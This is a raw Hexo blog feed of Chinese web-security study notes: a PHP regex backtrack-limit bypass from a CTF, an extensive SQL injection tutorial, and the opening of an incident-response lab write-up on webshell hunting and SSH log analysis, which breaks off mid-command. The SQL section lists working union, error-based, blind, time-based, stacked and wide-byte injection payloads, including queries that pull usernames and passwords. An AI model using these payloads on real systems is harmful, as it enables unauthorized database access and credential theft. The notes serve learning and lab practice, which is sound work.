a=%0aflag</span><br><span class="line">这个是/m修饰符会开启多行匹配，以换行符分割各行，有一行符合就返回true</span><br></pre></td></tr></table></figure><h3 id="最大回溯绕过："><a href="#最大回溯绕过：" class="headerlink" title="最大回溯绕过："></a>最大回溯绕过：</h3><p>php的正则回溯次数是1000000，超过这个次数就会返回false</p><p>这里简单记录一下大概什么时候可以用这个绕过，感觉不止是回溯，似乎往前寻找的次数超过了限制也能触发</p><p><strong>在关键词左右使用了贪婪匹配 *或 +</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;Y&#x27;]))&#123;</span><br><span class="line">    $N = (string)$_POST[&#x27;Y&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/.*myon/is&#x27;, $N))</span><br><span class="line">     &#123;</span><br><span class="line">     die(&quot;相见很容易&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (stripos($N, &#x27;swctfmyon&#x27;) === FALSE)</span><br><span class="line">     &#123;</span><br><span class="line">    die(&quot;再见却很难&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    echo $flag.&quot;\n&quot;;</span><br><span class="line">    var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);//检测最后一次正则表达式操作中的错误是不是回溯次数超出了限制</span><br></pre></td></tr></table></figure><p>这里要求字符串中有swctfmyonsnert，却不能有myon，<strong>在myon前有.*</strong>，如果放1000000个其他字符a，让php正则往后寻找次数超过限制，也是可以的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;Y&#x27;</span>:<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;swctfmyonsnert&#x27;</span>&#125;</span><br><span class="line">re = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure><p>另外：preg_match无法处理数组，直接传数组会返回false，strcmp以及其他处理字符串的函数也无法处理数组，会返回NULL或false,</p><p><strong>而对于strcmp，在如果比较的两个字符串相等也是返回0</strong>，使用弱类型比较会造成漏洞</p><p>常见的处理字符串的函数：</p><table><thead><tr><th>stripos</th><th>用于查找字符串中第一次出现子字符串的位置（不区分大小写）查找不到返回false</th></tr></thead><tbody><tr><td>strpos</td><td>类似stripos，但 strpos 是区分大小写的</td></tr><tr><td>strcmp</td><td>比较两个字符串，相同返回0</td></tr><tr><td>stristr</td><td>用于在字符串中查找首次出现的子字符串（不区分大小写），并返回该子字符串及其后面的所有内容。如果没有找到子字符串，则返回 false</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/04/22/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/04/22/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）<strong>即：注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p><h4 id="mysql查询知识："><a href="#mysql查询知识：" class="headerlink" title="mysql查询知识："></a>mysql查询知识：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql注入常用知识</span><br><span class="line">1.information_schema：表示所有信息，包括库、表、列</span><br><span class="line">2.information_schema.tables：记录所有表名信息的表</span><br><span class="line">3.information_schema.columns：记录所有列名信息的表</span><br><span class="line">4.table_schema：数据库的名称</span><br><span class="line">5.table_name:表名</span><br><span class="line">6.column_name:列名</span><br><span class="line">7.group_concat():显示所有查询到的数据</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>​    我们都知道web分为前端和后端，前端负责数据显示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询。(sql注入可以在sqli-labs进行练习)</p><p>假设一个登录页面的 SQL 查询是这样的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;;   </span><br></pre></td></tr></table></figure><p>如果用户输入的用户名是<code>admin</code>，密码是<code>123456</code>，那么这个查询会正常执行，验证用户的登录信息。但是，如果攻击者输入用户名是<code>admin&#39; --</code>，密码随便输入一个值，那么这个查询就变成了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;any_value&#x27;;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>--</code>是 SQL 中的注释符号，后面的密码验证部分被注释掉了，这样攻击者就可以绕过密码验证，成功登录系统。</p><h4 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h4><ul><li><p>前端用户传递到后端服务器的参数是可控的；</p></li><li><p>传递的参数能够被代入到后端服务器中执行相关数据库操作指令。</p></li><li><pre><code>通俗点讲就是当前想要进行SQL注入的Web界面是必须是动态网页，即前端数据与后端数据库进行交互，前端页面从后端获取数据信息进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 参数类型：</span><br><span class="line"></span><br><span class="line">###  数字型：</span><br><span class="line"></span><br></pre></td></tr></table></figure>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</code></pre></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 字符型：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹 例：select * from table where name&#x3D;’admin’</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 搜索型：</span><br><span class="line"></span><br><span class="line">一些网站为了方便用户查找网站的资源，都对用户提供了搜索的功能，因为是搜索功能，往往是程序员在编写代码时都忽略了对其变量(参数)的过滤，而且这样的漏洞在国内的系统中普遍的存在;</span><br><span class="line"></span><br><span class="line">其中又分为 POST/GET ，GET型的一般是用在网站上的搜索，而POST则用在用户名的登录，可以从form表单的 method=&quot;get&quot; 属性来区分是get还是post。搜索型注入又称为文本框注入。</span><br><span class="line"></span><br><span class="line">一般后台搜索组合的SQL语句如下:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$sql &#x3D; “select * from user where password like ‘%$pwd%’ order by password”;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 注入手法分类：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>联合查询注入<br>报错型注入<br>布尔盲注<br>时间盲注<br>堆叠查询注入<br>UA头注入<br>Cookie注入<br>宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(这里讲解注入手法只是粗略讲下)</span><br><span class="line"></span><br><span class="line">### 联合型注入：</span><br><span class="line"></span><br><span class="line">#### 条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>页面对不同的查询语句有不同的回显结果;根据每一步的返回结果判断和进行下一步操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 流程：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0)判断是否具有sql注入条件<br>1)判断sql注入漏洞是否存在及类型<br>2)判断sql查询字段数<br>3)判断回显点<br>4) 爆库名<br>5) 爆表名<br>6) 爆字段名<br>7) 爆数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>-1’ union select database() –+      #查询数据库名<br>-1’ union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+      #查询数据表名<br>-1’ union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’’ –+      #查询字段名<br>-1’ union select group_concat(username,’:’,password,’;’) from ‘表名’ –+      #查询数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 报错注入：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。<br>   报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这个就需要函数使用了</span><br><span class="line"></span><br><span class="line">#### 1. group by 重复键冲：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 2.extractvalue() 函数:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1’ and extractvalue(1,concat(‘^’,(select database()),‘^’)) –+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 3.updatexml() 函数：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1’ and updatexml(1,concat(‘‘,(database()),’’),1) –+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">然后正常的改database()就行了</span><br><span class="line"></span><br><span class="line">### 布尔注入：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;判断是否是 Mysql数据库<br>1’ and exists(select<em>from information_schema.tables) –+<br>&#x2F;&#x2F;判断是否是 access数据库<br>1’ and exists(select</em>from msysobjects) –+<br>&#x2F;&#x2F;判断是否是 Sqlserver数据库<br>1’ and exists(select*from sysobjects) –+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 常用的函数：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>substr(str,from,length):返回从下标为from截取长度为length的str子串。其中，首字符下标为1<br>length(str):返回str串长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 1.爆数据库名长度：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过循环i从1到无穷，使用length(database()) &#x3D; i获取库名长度，i是长度，直到返回页面提示query_success即猜测成功<br>例：1 and length(database())&#x3D;4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 2.根据库名长度爆库名：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获得库名长度i后，使用substr(database(),i,1)将库名切片，循环i次，i是字符下标，每次循环要遍历字母表[a-z]作比较，即依次猜每位字符<br>注意观察substr(database,i,1)<br>i从1开始（第i个字符）例：1 and substr(database(),1,1)&#x3D;‘a’</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。(sqlmap)</span><br><span class="line"></span><br><span class="line">#### 3、对当前库爆表数量：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">获取数据库内的表数量，使用mysql的查询语句select COUNT(*)。同样，要一个1到无穷的循环</span><br><span class="line"> 例：1 and (select COUNT(*) from information_schema.tables where table_schema=database())=1</span><br></pre></td></tr></table></figure><h4 id="4、根据库名和表数量爆表名长度："><a href="#4、根据库名和表数量爆表名长度：" class="headerlink" title="4、根据库名和表数量爆表名长度："></a>4、根据库名和表数量爆表名长度：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">得到表数量i后，i就是循环次数，i是表的下标-<span class="number">1</span>，大循环i次（遍历所有表），这里的i从<span class="number">0</span>开始，使用limit i ,<span class="number">1</span>限定是第几张表，内嵌循环j从<span class="number">1</span>到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度 </span><br><span class="line">注意观察limit i,<span class="number">1</span></span><br><span class="line">i从<span class="number">0</span>开始（第i+<span class="number">1</span>张表）</span><br><span class="line">例：</span><br><span class="line">?id=<span class="number">1</span> and <span class="title function_">length</span><span class="params">(select table_name from information_schema.tables where table_schema=database()</span> limit <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第一张表表名长度为<span class="number">4</span></span><br><span class="line">?id=<span class="number">1</span> and <span class="title function_">length</span><span class="params">(select table_name from information_schema.tables where table_schema=database()</span> limit <span class="number">1</span>,<span class="number">1</span>)=<span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第二张表表名长度为<span class="number">4</span></span><br></pre></td></tr></table></figure><h4 id="5、根据表名长度爆表名："><a href="#5、根据表名长度爆表名：" class="headerlink" title="5、根据表名长度爆表名："></a>5、根据表名长度爆表名：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再大循环i次（遍历所有表），内嵌循环j次（表名的所有字符），i是表下标-1，j是字符下标，再内嵌循环k从a到z（假设表名全是小写英文字符）尝试获取每个表的表名  </span><br><span class="line">注意观察substr((select…limit i,1),j,1)</span><br><span class="line">i从0开始（第i+1张表），j从1开始（第j个字符）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> substr((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=‘n’</span><br></pre></td></tr></table></figure><h4 id="6、对表爆列数量："><a href="#6、对表爆列数量：" class="headerlink" title="6、对表爆列数量："></a>6、对表爆列数量：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">操作同对当前库爆表数量的步骤，只是要查询的表不同</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">COUNT</span>(*) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="title function_ invoke__">database</span>() <span class="keyword">and</span> table_name=‘flag’)=<span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="7、根据表名和列数量爆列名长度和列名以及数据："><a href="#7、根据表名和列数量爆列名长度和列名以及数据：" class="headerlink" title="7、根据表名和列数量爆列名长度和列名以及数据："></a>7、根据表名和列数量爆列名长度和列名以及数据：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and length(select columns from information_schema.columns where table_schema=database() and table_name=‘flag’ limit 0,1)=4</span><br><span class="line">1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=‘flag’ limit 0,1),1,1)=‘i’</span><br><span class="line">1 and substr((select flag from sqli.flag),1，1)=“c”</span><br></pre></td></tr></table></figure><h3 id="时间注入："><a href="#时间注入：" class="headerlink" title="时间注入："></a>时间注入：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”--延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据，而采用一种突破注入的技巧。</span><br><span class="line">在 mysql 里 函数 sleep() 是延时的意思，sleep(10)就是数据库延时 10 秒返回内容。判断注入可以使用&#x27; and sleep(10)，数据</span><br><span class="line">库延时10秒返回值，网页响应时间至少要10秒，根据这个原理来判断存在 SQL 时间注入。</span><br><span class="line">mysql 延时注入用到的函数 sleep() 、if()、substring()</span><br><span class="line">select if(2&gt;1,sleep(10),0)，2&gt;1这个部分就是你注入要构造的 SQL 语句。</span><br><span class="line">select if(length(database())&gt;1,sleep(5),0)，这个就是查询当前库大于1，就会延时5秒执行。</span><br><span class="line">vince&#x27; and if(length(database())&gt;1,sleep(5),0)--+</span><br><span class="line">可以看到网页是大于五秒返回。根据这个原理 n&gt;1，n不延时就能确定当前数据库的长度了。</span><br></pre></td></tr></table></figure><h4 id="时间语句："><a href="#时间语句：" class="headerlink" title="时间语句："></a>时间语句：</h4><p>(函数大差不差的)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1,sleep(5),1) --+      #确定数据表长度和数据表数量</span><br><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;60,  sleep(5),1) --+      #确定数据表名的第一个字符</span><br><span class="line">1&#x27; and if(length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;3,sleep(5),1) --+      #确定字段名长度和字段数量</span><br><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;10,sleep(5),1) --+      #确定字段名的第一个字符</span><br><span class="line">1&#x27; and if (length((select password from security.users limit 0,1))&gt;3,sleep(5),1) --+      #确定数据的长度</span><br><span class="line">1&#x27; and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;10, sleep(5),0) --+      #确定数据的第一个字符</span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在注入点上插入多个查询语句，以便在单次注入中执行多个查询。</span><br></pre></td></tr></table></figure><h4 id="查询语句："><a href="#查询语句：" class="headerlink" title="查询语句："></a>查询语句：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;; show databases;       #查询数据库名，代替-1&#x27; union select databases</span><br><span class="line">-1&#x27;;use xxx(数据库);show tables;      #查询数据表名</span><br><span class="line">-1&#x27;;use xxx(数据库);show columns from `xxx(表)`;      #查询字段名，当纯数字字符串是表名的时候需要加反引号`             </span><br><span class="line">-1&#x27;;use xxx(数据库);handler `xxx` open as p;handler p read first;      # first修改为next可查询下一行</span><br></pre></td></tr></table></figure><h3 id="UA头注入-Cookie注入"><a href="#UA头注入-Cookie注入" class="headerlink" title="UA头注入&#x2F;Cookie注入:"></a>UA头注入&#x2F;Cookie注入:</h3><p>和之前的差不多，就是位置变了</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入:"></a>宽字节注入:</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个GBK汉字占两个字节，每个字节有自己的取值范围，如果设置GBK编码后，遇到连续两个字节，都符合GBK取值范围，会自动解析为一个汉字。</span><br><span class="line">Addslashes函数防止sql注入，将传入参数值进行转义。例如将 &#x27;转义为 \&#x27; ，这样我们在注入的时候闭合单引号就会变成 id=&#x27;1\&#x27;，这样会导致闭合失败从而注入失败。</span><br><span class="line">绕过方式：</span><br><span class="line">输入%df%27(%27解码后为单引号(&#x27;))，本来会转义%27为 \&#x27; ，但 \ 遇上%df相当于%5c(%5c解码后为反斜杠())和%df相遇，两者会合起来被解析成一个汉字(運)，这样变成 id=&#x27;1運&#x27; ，在MYSQL中效果等同于 id= &#x27;1&#x27; ，因而成功绕过。</span><br></pre></td></tr></table></figure><h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">宽字节注入主要是源于程序员使用的数据库编码与PHP编码设置为不同的两个编码。如果PHP的编码为UTF-8，而 MySql的编码设置为了 SET NAMES &#x27;gbk&#x27;​ 或是 SET character_set_client=gbk​ ，这样配置会引发编码转换从而导致的注入漏洞。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户输入：1%df&#x27; or 1=1#</span><br><span class="line">转义后为： 1%df\&#x27; or 1=1#</span><br><span class="line">由于SET NAMES gbk后，属于gbk编码2字节的范围</span><br><span class="line">因此%df\成为一个字符：運</span><br><span class="line">执行语句：SELECT * FROM users WHERE id=&#x27;1運&#x27; or 1=1#&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机应急响应上</title>
      <link href="/2025/04/20/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8A/"/>
      <url>/2025/04/20/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应："><a href="#应急响应：" class="headerlink" title="应急响应："></a>应急响应：</h1><h2 id="应急响应-webshell查杀："><a href="#应急响应-webshell查杀：" class="headerlink" title="应急响应-webshell查杀："></a>应急响应-webshell查杀：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机账号密码 root xjwebshell</span><br><span class="line">1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure><p>当你启动环境的一瞬间(你就没了0.5元)，我这里使用的是finalshell，他会给你一些数字什么的，比如:44.444.444.44 &#x2F;10.10.10.10</p><p>你使用finalshell连接，名称随便填，主机：44.444.444.44 账号和密码root xjwebshell 然后连接成功。就进入了终端</p><p>首先cd进入var&#x2F;www&#x2F;html(记得把html这个文件给他下载了)</p><p>文件作用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用途与作用：它是 Linux 系统中存放 Web 应用程序文件的默认目录之一。通常，当搭建一个基于 Linux 的 Web 服务器时，如使用 Apache 或 Nginx 等服务器软件，会将网站的所有静态文件（如 HTML、CSS、JavaScript 文件）以及动态脚本（如 PHP、Python 脚本等）放置在这个目录下，以便 Web 服务器能够正确地读取和处理这些文件，并将相应的网页内容展示给访问者。安全风险与关注点</span><br><span class="line">文件权限问题：该目录及其内部文件的权限设置至关重要。如果权限设置不当，例如文件或目录被设置为所有人可写，那么攻击者可能会利用这一漏洞上传恶意文件，如 webshell，进而获取服务器的控制权。</span><br><span class="line">跨站脚本攻击（XSS）：由于该目录存放着大量的网页文件，如果其中的 HTML 文件存在未经过滤的用户输入，攻击者可能会通过注入恶意脚本，实施 XSS 攻击，窃取用户的敏感信息或执行其他恶意操作。</span><br><span class="line">路径遍历攻击：攻击者可能尝试通过构造特殊的 URL 来遍历服务器的文件系统，访问 /var/www/html 目录以外的敏感文件。因此，Web 应用程序需要对用户输入的路径进行严格的验证和过滤，防止路径遍历漏洞的出现。</span><br><span class="line">恶意软件传播：如果该目录中的文件被植入恶意软件，那么当用户访问网站时，可能会在不知不觉中下载并执行这些恶意软件，导致用户的设备受到感染，个人信息被窃取等后果。</span><br></pre></td></tr></table></figure><p>因此这个文件是非常重要 然后根据题说黑客留下了后门，也就是小🐎，然后到这个文件夹里面执行linux命令查看后缀是php以及含有eval的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find ./ -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</span><br></pre></td></tr></table></figure><p>发现回显出来 gz.php 和shell.php(刚才ls看的时候看他就像一个小🐎) 和 .Mysqli.php</p><p>然后一个个查看发现gz.php里面注释好像flag(应该是)，然后看题说看他是哪个工具的shell 使用，(然后和lww以及h1php0q出去吃饭，回来上坡的时候和lww成为六驱驱动了)然后这个我去我那个渗透工具那看了看发现是哥斯拉，ok了，然后把html放到d盾上面扫一下发现没有.Mysqli.php,那这个肯定就是隐藏的shell了，然后在d盾上面还出来一个top.php，那这个应该就是最后的那个了</p><h2 id="应急响应-Linux日志分析："><a href="#应急响应-Linux日志分析：" class="headerlink" title="应急响应-Linux日志分析："></a>应急响应-Linux日志分析：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号root密码linuxrz</span><br><span class="line">ssh root@IP</span><br><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure><p>对于linux日志的话要先看他的系统版本因为不同版本的 Linux 系统在功能、配置和日志记录方式上可能存在差异。</p><p>命令(通过lsb_release 命令查询操作系统版本（可以与<code>uname -a</code>配合使用）)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p>发现是debian，根据题目描述推断发现是查询ssh相关日志</p><table><thead><tr><th>日志文件</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;log&#x2F;cron        记录与系统定时任务相关的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cups&#x2F;       记录打印信息的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;dmesg    记录了系统在开机时内核自检的信息。也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;btmp       记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下：[root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) #有人在6月4日22:38便用root用户在本地终端1登陆错误</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lasllog  记录系统中所有用户最后一次的登录时间的日志。这个文件也是二进制文件。不能直接用Vi查看，而要使用lastlog命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;maillog  记录邮件信息的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;messages 它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I&#x2F;O错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某人的身份切换为root，已经用户自定义安装软件的日志，也会在这里列出。</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure 记录验证和授权方面的信息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp 永久记录所有用户的登陆、注销信息，同时记录系统的启动、重启、关机事件。同样，这个文件也是二进制文件。不能直接用Vi查看，而要使用last命令查看</td></tr><tr><td>&#x2F;var&#x2F;tun&#x2F;ulmp 记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看</td></tr></tbody></table><p>在debian中，ssh登录日志通常保存在<code>/var/log/auth.log</code> .</p><p>我们用<code>grep &quot;sshd:&quot; /var/log/auth.log</code>来读取文件发现只能读取到我们登录后的数据，查看<code>/var/log/</code>发现存在点<code>auth.log.1</code>,读取为发现题目描述相关联的日志。</p><p>问题一：在爆破root账号日志会出现<code>Failed password for root from</code>+ip的字段，我们可以利用文档查找功能手动筛选出来。</p><p>同时我们也可以利用linux命令来提取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root from&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line">cat /var/log/auth.log.1 显示文件内容。</span><br><span class="line">grep -a &quot;Failed password for root&quot; 在文件中搜索所有包含 &quot;Failed password for root&quot; 的行。</span><br><span class="line">awk &#x27;&#123;print $11&#125;&#x27; 提取每行的第 11 个字段，即 IP 地址。</span><br><span class="line">sort 对提取出来的 IP 地址进行排序。</span><br><span class="line">uniq -c 统计每个 IP 地址出现的次数，并将其前缀显示到每行的开头。</span><br><span class="line">sort -nr 对 IP 地址出现次数进行逆序排序。（如果输入的文本为: 5 2 8 7 那么使用 sort -nr 命令后的输出将会是: 8 7 5 2）</span><br><span class="line">more 分屏显示结果，便于查看。</span><br></pre></td></tr></table></figure><p>也同样查询到三个ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 192.168.200.2</span><br><span class="line">1 192.168.200.32</span><br><span class="line">1 192.168.200.31</span><br></pre></td></tr></table></figure><p>按照顺序排序flag{192.168.200.2,192.168.200.32,192.168.200.31}</p><p>二：同理，爆破root账号爆破成功的ip会在日志出现<code>Accepted password for root from</code>+ip的字段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 